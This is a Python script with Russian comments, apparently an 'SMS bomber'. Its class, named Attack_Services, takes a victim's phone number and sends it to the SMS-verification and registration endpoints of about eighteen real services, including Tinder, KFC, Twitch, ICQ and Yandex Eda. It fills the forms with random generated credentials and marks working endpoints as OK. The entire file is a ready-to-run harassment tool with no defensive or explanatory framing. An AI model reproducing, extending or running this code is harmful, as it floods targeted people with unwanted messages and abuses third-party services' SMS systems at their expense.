import requests
import random


class Attack_Services:

    """

    Класс в котором прописаны все запросы для спама смс и обработка номера в корректный вид

    """

    def __init__(self, code_country, phone):
        """
        Инициализация кода страны и номера телефона для спама
        :param code_country: Код страны
        :param phone: Номер телефона

        """
        self.phone = str(phone)
        self.code_country = str(code_country)


    def code_countre_processing(self):
        """

        Оюработка кода страны в корректный вид для функций
        :return: None

        """
        if self.code_country[0] == '+':
            self.code_country = self.code_country[1:]


    def number_processsing(self):
        """

        Соединение кода страны и номера в одну строку для конечной функции спама и проверка на лишние знаки
        :return: None

        """
        self.phone = self.code_country + self.phone[-10:]
        for lett in self.phone:
            if lett not in '1234567890':
                assert False, 'Буквы либо лишние плюсы в формах для ввода'


    def creat_name_pass_username(self):
        """

        Функция создает данные для форм отправки запросов для отправки сообщейний

        :return: None

        """

        self.name = ''
        for i in range(12):
            self.name = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.username = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


    def spam(self):
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', #OK
                          data={'phone_number': self.phone}, headers={})
        except:
            print('Ошибка 1')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': self.phone}, headers={}) #OK
        except:
            print('Ошибка 2')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': self.phone}, headers={}) #OK
        except:
            print('Ошибка 3')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + self.phone}) # OK
        except:
            print('Ошибка 4')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': self.phone}) # OK
        except:
            print('Ошибка 5')


        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': self.phone})
        except:
            print('Ошибка 6')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + self.phone})
        except:
            print('Ошибка 7')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + self.phone + '/') #OK
        except:
            print('Ошибка 8')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + self.phone})
        except:
            print('Ошибка 9')


        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', #OK
                          data={'msisdn': self.phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except:
            print('Ошибка 10')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": self.phone}) #OK
        except:
            print('Ошибка 11')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": self.phone}) #OK
        except:
            print('Ошибка 12')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', #OK
                          json={"phone": "+" + self.phone, "api": 2, "email": "email", "x-email": "x-email"})
        except:
            print('Ошибка 13')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", #OK
                          data={"st.r.phone": "+" + self.phone})
        except:
            print('Ошибка 14')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': self.phone})
        except:
            print('Ошибка 15')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', # OK
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": self.password, "phone_number": self.phone, "username": self.username})
        except:
            print('Ошибка 16')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',#OK
                          json={"phone_number": "+" + self.phone})
        except:
            print('Ошибка 17')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.phone}) #OK
        except:
            print('Ошибка 18')

def start(code_country, phone):
    a = Attack_Services(code_country, phone)
    a.code_countre_processing()
    a.number_processsing()
    a.creat_name_pass_username()
    a.spam()
